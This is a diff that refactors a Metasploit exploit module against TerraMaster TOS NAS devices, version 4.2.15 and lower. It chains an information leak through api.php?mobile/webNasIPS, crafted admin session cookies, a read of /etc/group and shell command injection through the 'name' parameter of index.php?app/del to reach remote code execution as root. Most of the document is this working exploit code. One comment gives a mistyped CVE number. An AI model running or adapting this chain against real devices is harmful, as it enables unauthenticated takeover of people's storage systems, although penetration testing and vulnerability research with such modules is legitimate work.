@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'Name' => 'TerraMaster TOS 4.2.15 or lower - RCE chain from unauthenticated to root via session crafting.',
         'Description' => %q{
           Terramaster chained exploit that performs session crafting to achieve escalated privileges that allows
-          an attacker to access vulnerable code execution flaws. TOS versions 4.2.15 and below  are affected.
+          an attacker to access vulnerable code execution flaws. TOS versions 4.2.15 and below are affected.
           CVE-2021-45839 is exploited to obtain the first administrator's hash set up on the system as well as other
           information such as MAC address, by performing a request to the `/module/api.php?mobile/webNasIPS` endpoint.
           This information is used to craft an unauthenticated admin session using CVE-2021-45841 where an attacker
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Exploit::Remote
     # Initialise instance variable data to store the leaked data
     @data = {}
 
-    # Get the data by exploiting the LFI vulnerability thru vulnerable endpoint `api.php?mobile/webNasIPS`.
+    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`.
     # CVE-2021-458439
     res = send_request_cgi({
       'method' => 'POST',
@@ -124,6 +124,16 @@ class MetasploitModule < Msf::Exploit::Remote
     return Digest::MD5.hexdigest(id.encode('utf-8'))
   end
 
+  def get_headers
+    {
+      'User-Agent' => 'TNAS',
+      'User-Device' => 'TNAS',
+      'Authorization' => @data['password'],
+      'Signature' => @data['signature'],
+      'Timestamp' => @data['timestamp']
+    }
+  end
+
   def download_admin_users
     # Initialise instance variable admin_users to store the admin users from /etc/group
     @admin_users = []
@@ -136,13 +146,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/fileDownload'),
       'ctype' => 'application/x-www-form-urlencoded',
       'cookie' => "kod_name=guest; kod_token=#{tos_encrypt_str(@data['key'], '')}",
-      'headers' => {
-        'User-Agent' => 'TNAS',
-        'User-Device' => 'TNAS',
-        'Authorization' => @data['password'],
-        'Signature' => @data['signature'],
-        'Timestamp' => @data['timestamp']
-      },
+      'headers' => get_headers,
       'vars_post' => {
         'path' => '/etc/group'
       }
@@ -150,6 +154,8 @@ class MetasploitModule < Msf::Exploit::Remote
     # get the admin users from /etc/group
     if res && res.code == 200 && res.body.include?('admin')
       res.body.each_line do |line|
+        next if line.empty?
+
         field = line.split(':')
         next unless field[0] == 'admin'
 
@@ -170,32 +176,20 @@ class MetasploitModule < Msf::Exploit::Remote
     for admin in @admin_users
       res = send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};xx%23"),
+        'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};%23"),
         'ctype' => 'application/x-www-form-urlencoded',
         'keep_cookies' => true,
         'cookie' => "kod_name=#{admin}; kod_token=#{tos_encrypt_str(@data['key'], @data['password'])}",
-        'headers' => {
-          'User-Agent' => 'TNAS',
-          'User-Device' => 'TNAS',
-          'Authorization' => @data['password'],
-          'Signature' => @data['signature'],
-          'Timestamp' => @data['timestamp']
-        }
+        'headers' => get_headers
       })
       if res && res.code == 302 && !res.body.include?(marker.to_s)
         # Send second request to establish a session and break from the loop if true.
         res = send_request_cgi({
           'method' => 'GET',
-          'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};xx%23"),
+          'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;echo${IFS}#{marker};%23"),
           'ctype' => 'application/x-www-form-urlencoded',
           'keep_cookies' => true,
-          'headers' => {
-            'User-Agent' => 'TNAS',
-            'User-Device' => 'TNAS',
-            'Authorization' => @data['password'],
-            'Signature' => @data['signature'],
-            'Timestamp' => @data['timestamp']
-          }
+          'headers' => get_headers
         })
       end
       next unless res && res.code == 200 && res.body.include?(marker.to_s)
@@ -203,7 +197,7 @@ class MetasploitModule < Msf::Exploit::Remote
       session = true
       break
     end
-    return session
+    session
   end
 
   def get_terramaster_info
@@ -235,21 +229,15 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(cmd, _opts = {})
-    # Execute payload using vulnerable endpoint `index.php?app/del&id=0&name=;<PAYLOAD>;xx%23`
+    # Execute payload using vulnerable endpoint `index.php?app/del&id=0&name=;<PAYLOAD>;%23`
     # CVE-2021-45837
     payload = CGI.escape(cmd)
     send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;#{payload};xx%23"),
+      'uri' => normalize_uri(target_uri.path, 'tos', "index.php?app/del&id=0&name=;#{payload};%23"),
       'ctype' => 'application/x-www-form-urlencoded',
       'keep_cookies' => true,
-      'headers' => {
-        'User-Agent' => 'TNAS',
-        'User-Device' => 'TNAS',
-        'Authorization' => @data['password'],
-        'Signature' => @data['signature'],
-        'Timestamp' => @data['timestamp']
-      }
+      'headers' => get_headers
     })
   end
 
@@ -257,11 +245,11 @@ class MetasploitModule < Msf::Exploit::Remote
     get_terramaster_info
     return CheckCode::Safe if @terramaster.empty?
 
-    if @terramaster['tos_version'] <= '4.2.15'
+    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.15')
       return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
-    else
-      return CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
     end
+
+    CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
   end
 
   def exploit
